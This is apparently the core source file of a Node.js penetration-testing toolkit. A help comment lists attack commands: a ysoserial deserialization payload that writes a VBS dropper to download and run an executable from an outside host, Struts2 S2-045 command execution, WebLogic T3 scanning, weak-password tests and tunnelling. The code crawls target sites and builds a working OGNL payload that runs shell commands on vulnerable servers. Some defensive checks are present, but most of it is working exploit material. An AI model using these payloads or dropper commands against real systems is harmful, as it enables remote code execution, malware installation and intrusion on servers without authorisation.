	java -jar ./ysoserial-master-v0.0.5-gb617b7b-16.jar  CommonsCollections1  '@echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://192.168.24.15:8888/Love.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "mess.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("mess.exe")>>poc.vbs&cscript.exe poc.vbs'


	node checkUrl.js -u http://192.168.10.15:8080/ --struts2 045 --cmd 'tasklist -svc'

	# 批量开放T3检测，txt中可以放url
	node checkUrl.js --t3 checkT3hostsUrlsFile.txt
	# 常见webshell和url扫描
	node checkUrl.js -s ./urls/webshell.txt -m ./urls/ta3menu.txt -u http://192.168.10.115:8080/

	# 当别人能够访问你，但是不能访问10.115的时候，进行端口转发，
	# 这样别人访问你的9000等同于访问10.115的8080，https的时候不使用，因为数字证书会检查域名
	node portForward.js 9000 192.168.10.115 8080

	# T3协议漏洞的检测和利用
	java -jar jfxl.jar 192.168.19.30:7001

	# 指定一个网段的漏洞验证扫描
	java -jar jfxl.jar 192.168.19.30-255:7001

	# 目录、文件中文本文件字符集批量转换为utf-8
	# 后渗透后得到很多win的数据txt文件，字符集gbk批量转换为utf8
	node gbk2utf8.js fileOrDirName

	# 多种解码
	node decode.js base64等格式字符串

	# eml 文件批量读取、转换
	node emlToFileToos.js /Volumes/MyWork/eml /Volumes/MyWork/eml_data

	# 手工XSS、渗透时需要的一些常用编码、解码
	open strDecodeEncode.html

	# 获取图片中的元数据（经纬度、创建时间）
	node getFileMetadata.js yourJpgFile.jpg

	# jndi内网无密码访问漏洞测试
	java -jar ./JNDI_TEST/JNDITEST.jar -p 7101 -u 192.168.10.216 -j QIMS_TEST -d mysql

	# weblogic中间件T3漏洞扫描
	编辑ip.txt
	python ./weblogic.py

	# 二维码解码
	node QrCodeDecode.js Haiios.jpg

	# svn 弱密码检测 2017-01-22 M.T.X
	node checkSvn.js http://18.12.88.10:8090/svn/ userName Pswd

	# 信箱默认密码测试
	node testPop3.js 12.171.20.20 110 mytels.txt

	# http代理，有时候需要一个二级代理，来获得、修改一些数据
	# 动态代理，每次自动随机使用代理
	node proxy/ProxyServer.js
	or
	pm2 start ProxyServer.js -i max

	# 更新代理 autoProxy.txt

	node checkProxy.js
	cat autoProxy.txt|sort|uniq >ok.txt
	mv ok.txt autoProxy.txt
	cat autoProxy.txt|wc -l

	# 提取目录、文件，包含二进制文件中 ip信息
	# 被入侵后，查看整个目录中所有ip信息，包含bin，可自行文件中的ip信息
	node getIps.js fileOrDir

	# 发送无跟踪邮件
	sendmail.js  内容自行修改
	邮件跟踪功能，当对方阅读后，能够从http://23.105.209.65/获取到阅读邮件的ip、user-agent等信息
	proxychains4 -f ~/pc.conf  node sendmail.js 

	# 某种js压缩后的解码、压缩编码, win下运行
	压缩.hta

批量ip归属查询
node ./myapp/lib/myMysql.js -k myLogs.txt

	# 连接http隧道
	python reGeorgSocksProxy.py -l 127.0.0.1 -p 8080 -u http://11.22.10.10:8070/ip/x.jsp

node checkUrl.js -u 'http://19.16.14.19:8133/pxorg/login.jsp' --struts2 045 --cmd 'find . -name 417.jsp 2>/dev/null'

node checkUrl.js -u 'http://22.15.21.18:8082/sjcj/login.jsp' -v --struts2 weblogic

node checkAll.js -v --struts2 struts2

#!/usr/bin/env node
var kkk = require('./lib/core_new.js');
var r = new kkk();
// -v 参数才会输出
r.on('log',function(s)
{
	console.log(s);
});
r.on('info',function(s)
{
	console.log(s);
});
r.on('error',function(s)
{
	// console.log(s);
});
// 发现安全问题才会进入这里
r.on('vul',function(v,t,s)
{
	if(v.vul)console.log(v);
});

r.on('ready',function()
{
	console.log('准备好了....');
	// r.runChecks();
});
	*/
	},fnMyHelp:function(fn)
	{
		var s = (fn||_t.fnHelp).toString().split(/\n/).slice(2, -2).join('\n');
		if(fn)return s
		console.log(s);
	},
	fnOptHeader:function(o)
	{
		var k = {'followAllRedirects':true,'followRedirect':true,"timeout":o.timeout||_t.timeout,'pool': {'maxSockets': _t.g_nPool}};
		for(var i  in k)
		{
			if(!o[i])o[i] = k[i];
		}
		return o;
	},// 指定字符转换url编码
	fnUrlEncode:function(s,cs)
	{
		var rg = new RegExp("([" + cs.replace(/([\(\)\[\]\$\.\\\/\{\}\?\*])/gmi,"\\$1") + "])","gmi");
		return s.replace(rg,function(a,b)
		{
			return '%' + b.charCodeAt(0).toString(16);
		});
	},// 对指定字符进行编码、转码
	fnUrlEncode2:function(x1)
	{
		return _t.fnUrlEncode(x1,'#:@=.[]?( )%/+${}');
	},// 检查返回结果是否有返回结果
	fnCheckVul1:function(body)
	{
		body = String(body);
		var xx1 = body.split("whoami:");
		if(0 < xx1.length)
		{
			body = "whoami:" + xx1[1];
			xx1 = body.split("\ncmdend");
			if(0 < xx1.length)
			{
				body = xx1[0] + "\ncmdend\n";
			}
		}
		return body.replace(/\r/gmi,'').replace(/\n+/gmi,"\n");
	},
	/*
	防止重复执行：
	获取表单数据，并推进表单字段测试
	*/
	g_oForm:{}, 
	fnGetRegMath:function(s,r,n,oM)
	{
		var a,k = [],o = oM, rTmp = /.*?(sURL|#|encodeURI|href|url|javascript).*/gmi;
		if(!s)return k;
		while(a = r.exec(s))
		{
			if(o[a[n]] || rTmp.exec(a[n]))continue;
			o[a[n]] = 1;
			k.push(a[n]);
		}
		o = null;
		return k;
	},
	fnDoForm:function(s,url,rep,t)
	{
		s = s || rep&&rep.body;
		if(!s)
		{
			try{
				var oT = _t.fnGetCall(4);
				if(oT && oT['arguments'])
				s = 2 < oT.arguments.length ? oT.arguments[2]: oT.arguments[0];
			}catch(e){}
		}
		// console.log(body)
		var g_oForm = _t.g_oForm;
		if(s && url)
		{
			if(g_oForm[url])return;
			// 有些输入对象只有id
			var re = /<input .*?(?:name|id)=['"]*([^\s'"]+)['"]*\s[^>]*>/gmi,oFFds = {},n = 0,
			    reFa = /action=['"]*([^\s"'><]+)['"]*/gmi,
			    aHref = /\s*(href|URL|action)=['"]*([^\s"'><]+)['"]*/gmi,
			    aHref1 = /\s*(?:(?:encodeURI\()|(?:url["']?\s*:\s*))['"]?([^\s"'><]+)['"]?/gmi;
			var a = reFa.exec(s),szUrl = url,oCul1 = _t.parseUrl(url);
			// 获取当前页面中的action路径非常重要
			if(a &&  0 < a.length &&  a[1])
			{
				if('/' == a[1].substr(0,1))
				{
					// no : fix
					szUrl = [oCul1.protocol,'//',oCul1.host,a[1]].join('');
				}
				else
				{
					var szT111 = szUrl.replace(/\/*[^\/]*$/gmi,'');
				 	szUrl =  (15 < szT111.length ? szT111: szUrl)+ "/" + a[1];
				}
				if(-1 < szUrl.indexOf(".do/logon.do"))
					_t.log("注意，url存问题，请反馈开发者优化爬虫：" + szUrl)
			}
			else szUrl = szUrl.substr(0, szUrl.lastIndexOf('/'));
			// console.log(s);
			// 抽取form字段
			while(a = re.exec(s))
			{
				oFFds[a[1]]='';
				n++;
			}
			// console.log("oFFds:");
			// console.log(oFFds);
			if(0 < n)_t.log("找到字段： " + JSON.stringify(oFFds)),_t.runChecks(szUrl,"parms"+(program.struts2 ? "," + program.struts2 : ""),null,oFFds);

			// 连接的遍历、获取、探测
			var aTmp = [];
			aTmp.push1=function(s)
			{
				var rTmp = /.*?(sURL|#|encodeURI|href|url|javascript).*/gmi;
				if(rTmp.exec(s))return this;
				s = s.replace(/\).*$/gmi,'');
				if(s && 14 < s.length)this.push(s);
			};
			var oT1 = {};
			var aRst = _t.fnGetRegMath(s,aHref1,1,oT1);

			if(0 < aRst.length)
			{
				for(var x in aRst)
					oT1[aRst[x]] = 1
			}
			var aT11 = _t.fnGetRegMath(s,aHref,2,oT1);
			aRst = aRst.concat(aT11);
			
			var a = [];
			if(0 < aRst.length)
			{
				for(var x =0 ; x < aRst.length; x++)
				{
					szUrl = url;
					a[1] = String(aRst[x]);
					
					// 跳过静态文件
					var g_rStc = /\.(htm|js|png|jpg|jpeg|css|cab|exe|swf|jar|ico|doc|docx|pdf|xls|jhtml|html|svg)\b/gmi;
					if(1 >= a[1].length || /javascript|void/gmi.test(a[1]) || g_rStc.test(a[1]))continue;

					if('/' == a[1].substr(0,1))// no : fix
						szUrl = [oCul1.protocol,'//',oCul1.host,a[1]].join('');
					else if(0 == a[1].indexOf("http"))
					{
						var nT1 = Math.min(a[1].length, url.length);
						// 同源才继续
						if(15 < a[1].length && a[1].substr(0, nT1) == url.substr(0, nT1))
						{
							aTmp.push1(a[1]);
						}
						continue;
					}
					else
					{
						var szT11 = szUrl.replace(/\/*[^\/]*$/gmi,'');
						szUrl = (16 < szT11.length ? szT11: szUrl) + "/" + a[1];
						if(-1 < szUrl.indexOf(".do/logon.do"))
							_t.log("注意1，url存问题，请反馈开发者优化爬虫：" + szUrl)
					}
					aTmp.push1(szUrl);
					// runChecks(s,"struts2",szUrl);
				}
			}
			
			if(0 < aTmp.length)
			{
				_t.log("爬取到以下链接：\n" + aTmp.join("\n"));
				async.mapLimit(aTmp,_t.g_nThread,function(s,fnCbk1)
				{
					g_oForm[s] = 1;
					_t.runChecks(s,program.struts2||"web,struts2",function(o,_t1)
					{
						_t.fnReport(o,_t1);
					});
					try{if(fnCbk1 && "function" == typeof fnCbk1)fnCbk1();}catch(e){}
				});
			}
			// 表示这个页面的form分析过了,不能加，否则有些检测不到
			// 但是会容易导致死循环
			s = String(s);
			if(-1 == s.indexOf('Location:'))
				g_oForm[url] = 1;
		}
		else
		{
			log(['注意，没有获取到返回的html进行深度分析：',url,'\n',s,'建议你多次运行本程序，'].join(''));
		}
	},fnGetCall:function(n)
	{
		n++;
		try{
			var x = 0,oT = arguments.callee;
			while(n > ++x)
			{
				if(oT.callee)oT = oT.callee;
				else if(oT.caller)oT = oT.caller;
				else if(oT.arguments)
				{
					oT = oT.arguments;
					if(oT.callee)oT = oT.callee;
					else if(oT.caller)oT = oT.caller;
				}
			}
		}catch(e){}
		return oT;
	},// 获取Ta3异常消息
	fnGetErrMsg:function(body)
	{
		if(body)
		{
			body = body.toString();
			_t.fnCheckKeys(body);
			var s1 = "Base._dealdata(", i = body.indexOf(s1);
			if(-1 < i)body = body.substr(i + s1.length);
			s1 = "});";
			i = body.indexOf(s1);
			if(-1 < i)body = body.substr(0, i + 1);
			try
			{
				if(g_reServer)// 提取的表达式
				{
					var oS = g_reServer.exec(body);
					if(oS && 0 < oS.length && g_oRst.server)g_oRst.server += " " + oS[1],g_reServer = null;
				}
				var o = JSON.parse(body = body.replace(/'/gmi,"\"").replace(/\t/gmi,"\\t\\n").replace(/&nbsp;/gmi," "));
				return o.errorDetail;
			}catch(e)
			{
				var bHv = false;
				i = body.indexOf("at com.");
				if(bHv = -1 < i)body = body.substr(i - 11);
				i = body.lastIndexOf("at ");
				if(-1 < i)bHv = true,body = body.substr(0,i);
				if(bHv)return body;
			}
		}
		return "";
	},
	// 缓存正则表达式，便于提高效率
	g_reKeys:null,
	/* 对返回的html进行规范检查autocomplete
	1、密码字段关闭autocomplete
	2、以及密码字段是否在ettercap的监听中
	*/
	fnCheckKeys:function(b)
	{
		var g_reKeys = _t.g_reKeys,a,s,r = [],re = /<.*?type=['"]*password['"]*\s[^>]*>/gmi, r1 = /autocomplete=['"]*(off|0|no|false)['"]*/gmi,
			g_oRst = _t.g_oRst;
		g_oRst.checkKeys || (g_oRst.checkKeys = {});
		var oMp = {}, ss;
		if(!g_oRst.checkKeys.passwordInputs)
		{
			while(a = re.exec(b))
			{
				if(!r1.exec(a[0]))
				{
					ss = a[0].replace(/[\r\n\t"'']/gmi,"").replace(/\s+/gmi," ");
					if(!oMp[ss])
						oMp[ss] = 1,r.push(ss);
				}
			}
			if(0 < r.length)g_oRst.checkKeys.passwordInputs = {"des":"密码字段应该添加autocomplete=off",list:r};
		}
		oMp = {};
		s = program.keys || __dirname + "/../urls/keywords";
		if(!g_oRst.checkKeys.keys && fs.existsSync(s))
		{
			a = g_reKeys || new RegExp("(" + String(fs.readFileSync(s)).trim().replace(/\n/gmi,"|") + ")=","gmi");
			g_reKeys = a;
			re = [];
			while(s = a.exec(b))
			{
				if(!oMp[s[1]])
					oMp[s[1]]=1,re.push(s[1]);
			}
			if(0 < re.length)g_oRst.checkKeys.keys = {"des":"这些关键词在网络中容易被监听，请更换",list:re};
		}
	},
	// 各RCE漏洞返回检查
	fnDoBody:function(body,t,url,rep,fnCbk)
	{
		fnCbk ||(fnCbk=function(){});
		var oRst = {};
		// win 字符集处理
		if(body && -1 < String(body).indexOf("[^\/]administrator"))
		{
			try{body = iconv.decode(body,"cp936").toString("utf8");}catch(e){_t.error(e,'fnDoBody')}
		}
		if(body)body = body.toString();
		oRst.body = body;
		// 字段及连接钻取
		_t.fnDoForm(body,url,rep,t);
		if( -1 == String(body||"").indexOf("whoami:\n"))return fnCbk(oRst);

		var e = _t.fnGetErrMsg(body);
		if(e)oRst.errMsg = e.toString().replace(/<[^>]*>/gmi,'');//.trim();
		// console.log(t);
		var oCa = null;
		try{oCa = arguments.callee.caller.arguments;}catch(e){}
		if(!rep)rep = oCa[1];
		// error msg
		if(oCa[0])_t.log(oCa[0]);
		var repT = oCa[1] || {};
		
		// safegene
		if(repT && repT.headers && repT.headers['safegene_msg'])
			fnLog(decodeURIComponent(repT.headers['safegene_msg']));

		if(repT && repT.headers && repT.headers["struts2"])
		{
			oRst[t] = "发现struts2高危漏洞" + t + "，请尽快升级";
			oRst.vul = true;
		}

		body||(body = "");
		if(!body)
		{
			// myLog(arguments);
		}

		if(!body)return fnCbk(oRst);
		body = body.toString("utf8").trim();
		var rg1 = /(__VIEWSTATEGENERATOR)/gmi;
		if(rg1.test(body))return fnCbk(oRst);

		// console.log(body.indexOf("echo+whoami"));return;
		oRst.config || (oRst.config = {});
		if(!oRst.config["server"] && -1 < body.indexOf("at weblogic.work"))
		{
			oRst.config["server"] = "配置缺失；信息泄露中间件为weblogic";
		}
		// at 
		if(!oRst.config["dev"])
		{
			var re = /Exception\s+at ([^\(]+)\(/gmi;
				re = re.exec(body);
			if(re && 0 < re.length)
			{
				oRst.config["dev"] = "配置缺失；信息泄露开发商为:" + re[1];
			}
		}
		if(!oRst.config["x-powered-by"] && rep && rep.headers)
		{
			if(rep.headers["x-powered-by"] && -1 < rep.headers["x-powered-by"].indexOf("JSP/"))
			{
				oRst.config["x-powered-by"] = "配置缺失；信息泄露实现技术：" + rep.headers["x-powered-by"];
			}
		}
		if(!oRst.config["server"] && rep && rep.headers)
		{
			if(rep.headers["server"] && -1 < rep.headers["server"].indexOf("/"))
			{
				oRst.config["server"] = "配置缺失；信息泄露实现技术：" + rep.headers["server"];
			}
		}

		var nwhoami = 0;
		if(t && program.cmd && -1 == body.indexOf("<body"))_t.log(t + "\n" + body);
		if(!body || -1 == (nwhoami = body.indexOf("whoami")))return fnCbk(oRst);;
		
		//if(-1 < t.indexOf("s2-001"))console.log(body)
		body = body.substr(nwhoami).replace(/\n+/gmi,'\n');
		var i = body.indexOf("cmdend") || body.indexOf("<!DOCTYPE") || body.indexOf("<html") || body.indexOf("<body");
		if(-1 < i)body = body.substr(0,i);
		// if("s2-045" == t)console.log(body)
		// if(-1 < t.indexOf("s2-053"))console.log(body);
		// 误报
		if(-1 < body.indexOf("<body") && -1 == body.indexOf("whoami:") && -1 == body.indexOf("pwd:"))
		{
			_t.log(body);
			return fnCbk(oRst);
		}
		oRst.vul = true;
		_t.vulinfo("发现高危漏洞("+ (url || rep && rep.request && rep.request.uri &&rep.request.uri.href || "") +"):\n" + t);
		
		if(0 < i) body = body.substr(0, i).trim().replace(/\u0000/gmi,'');
		// console.log(body);
		var oT = oRst,s1 = String(body).replace(/\r/gmi,'').split(/\n/);
		oT[t] = "发现struts2高危漏洞" + t + "，请尽快升级";
		if(-1 < body.indexOf("root") && !oT["root"])
			oT["root"] = "中间件不应该用root启动，不符合公司上线检查表要求";
		if(s1[0] && 50 > s1[0].length && !oT["user"])
			oT["user"] = "当前中间件启动的用户：" + String(-1 < s1[0].indexOf('whoami')? s1[1]:s1[0]).trim();
		var szMdPath = String(3 < s1.length ? s1[3] : "").trim();
		if(1 < s1.length && !oT["CurDir"] && szMdPath)
			oT["CurDir"] = {des:"当前中间件目录","path":szMdPath};
		fnCbk(oRst);
	},
	fnMkPayload:function(w,l)
	{
		w || (w = _t.g_szCmdW);
		l || (l = _t.g_szCmd);
		if(_t.program.cmd)
			w = l = _t.program.cmd;
		if(!w || !l)
			_t.log("请注意，当前执行命令不能为空");
		_t.copyO2O({g_postData:"%{(#nike='multipart/form-data')"
			// s-045不允许下面的代码
			// + ".(#_memberAccess['allowStaticMethodAccess']=true)"
			// + ".(#_memberAccess['acceptProperties']=true)"
			// + ".(#_memberAccess['excludedPackageNamePatterns']=true)"
			// + ".(#_memberAccess['excludedPackageNamePatterns']=true)"
			// + ".(#_memberAccess['excludedClasses']=true)"
			+ ".(#rplc=true)"
			+ ".(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)" 
			+ ".(#_memberAccess?(#_memberAccess=#dm):" 
			+ "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])" 
			+ ".(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))"
			+ ".(#ognlUtil.getExcludedPackageNames().clear())"
			+ ".(#ognlUtil.getExcludedClasses().clear())"
			+ ".(#context.setMemberAccess(#dm))))"
			+ ".(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))"
			+ ".(#cmds=(#iswin?{'cmd.exe','/c','" + w + "'}:{'/bin/bash','-c','" + l + "'}))"
			+ ".(#p=new java.lang.ProcessBuilder(#cmds))"
			+ ".(#p.redirectErrorStream(true)).(#process=#p.start())"
			// response.addHeader
			+ ".(#response=@org.apache.struts2.ServletActionContext@getResponse())"
			// + ".(#response.addHeader('struts2','_struts2_'))"
			+ ".(#ros=(#response.getOutputStream()))"

		    // 我添加的当前位置行加上后，会无法输出
		    // + ".(#ros.write(@org.apache.struts2.ServletActionContext@getRequest().getServletContext().getRealPath('.').getBytes()))"
			// + ".(@org.apache.commons.io.IOUtils@copy(new java.io.InputStreamReader(#process.getInputStream(),#iswin?'gbk':'UTF-8'),#ros))"
			 + ".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))"
			+ ".(#ros.flush()).(#ros.close())}"},_t);
	}
	},_t);

	// 多个关键词的搜索,该方法放在各插件中，所以里面的this，是指当前的插件
	function fnCheckTags(s)
	{
		var o = this._t,a = s.split(_t.g_szSplit);
		if(o)
		{
			for(var i = 0; i < a.length; i++)
			{
				if(o[a[i]])return true;
			}
			return false;
		}
		
		return false;
	}

	// 为每个插件，初始化关键词
	function fnInitTags(o)
	{
		o.suport = _t.g_szMyMsg;
		o.self = _t;
		var a = o.tags.split(_t.g_szSplit);
		o._t || (o._t = {});
		for(var i = 0; i < a.length; i++)
		{
			o._t[a[i]] = true;
		}
		o["fnCheckTags"] = fnCheckTags;
		var oIds = {"001":"020101"
			,"005":"020110"
			,"007":"020111"
			,"008":"020109"
			,"009":"020119"
			,"012":"020112"
			,"013":"020113"
			,"015":"020114"
			,"016":"020104"
			,"019":"020115"
			,"029":"020116"
			,"032":"020106"
			,"033":"020108"
			,"037":"020107"
			,"045":"020102"
			,"046":"020103"
			,"048":"020117"
			,"052":"020105"
			,"052":"020120"
			,"053":"020118"};
		if(o._t["struts2"])
		for(var k in oIds)
		{
			if(o._t[k])
			{
				o.ID = oIds[k];
				// _t.info(["ID =",o.ID, o.tags].join(" "));
				break;
			}
		}
	}
	
	// 遍历lib下所有目录，加载所有插件，并驱动执行
	function doImportAllPlugIns(filename,fnCbk)
	{
		global.g_myPlugs || (global.g_myPlugs = {});
		fnCbk(1);
		fs.stat(filename,function(e,stats)
		{
			if(stats.isFile() && /\.(js)/gmi.test(filename) && fs.existsSync(filename))
			{
				try{
					// 跳过入口主文件
					if(/core(_new)*\.js$/gmi.exec(filename));
					else 
					{
						var k = global.g_myPlugs[filename] || require(filename);
						
							fnInitTags(k),
							_t.g_oAllPlugins[filename] = k
						if(!global.g_myPlugs[filename])
							//_t.info("loaded " + filename),
							global.g_myPlugs[filename] = k;
					}
				}catch(e1){_t.error(e1,'doImportAllPlugIns');}
			}
			else if(stats.isDirectory())
			{
				var aF = fs.readdirSync(filename,{});
				fnCbk(aF.length);
				aF.forEach(function(i)
				{
					// 顺便删除无用的缓存文件
					if(".DS_Store" == i)
					{
						fs.unlinkSync(filename + "/" + i);
					}
					else doImportAllPlugIns(filename + "/" + i,fnCbk);
					fnCbk(-1);
				});
			}
			fnCbk(-1);
		});
	}
	fnInit();
	_t.fnMkPayload();

	if(url)_t.runChecks(url, program.struts2||"struts2,web,weblogic");
	var k1 = /\/([^\.\/]+)$/gmi.exec(url);
	
	if(url && /\/$/gmi.exec(url) || k1)
	{
		var szUt1 = url + "/login.jsp";
		szUt1 = szUt1.replace(/\/\/login\.jsp$/gmi,'/login.jsp');
		_t.runChecks(szUt1, program.struts2||"struts2,web,weblogic");
	}

	// 加载所有的插件动态库
	// 各种插件库分开编写，便于维护
	// eval(fs.readFileSync(a[k])+'');
	process.title = 'MTX_V 2.0'
	process.stdin.setEncoding('utf8');
	process.env.NODE_ENV = "production";
	// process.on('uncaughtException', _t.error);
	
	
	// 加载插件，完成后发出ready事件
	doImportAllPlugIns(__dirname,function(n)
	{
		g_bInit = g_bInit + n;
		if(0 == g_bInit)
			_t.listPlugs(),
			_t.emit('ready');
	});

	/*/ 获取对request包装后的接口
	var a = fnGetPlugIn("request");
	if(a && 0 < a.length)
	{
		request = function(o,fnCbk)
		{
			for(var k in a)
			{
				var o = a[k];
				try{
					o.doCheck(o,fnCbk);
				}catch(e){fnLog(e)}
			}
			request(o,fnCbk);
		};
	}
	////////////////*/

	String.prototype.trim=function()
	{
		return this.replace(/(^\s*)|(\s*$)/gmi,'');
	};

	Array.prototype.indexOf=function(s)
	{
		for(var k in this)
		{
			if(s == this[k])return k;
		}
		return -1;
	};
};
// fnCheckUrl.prototype.emit = EventEmitter.prototype.emit;
// fnCheckUrl.prototype.once = EventEmitter.prototype.once;
inherits(fnCheckUrl, EventEmitter);
module.exports = fnCheckUrl;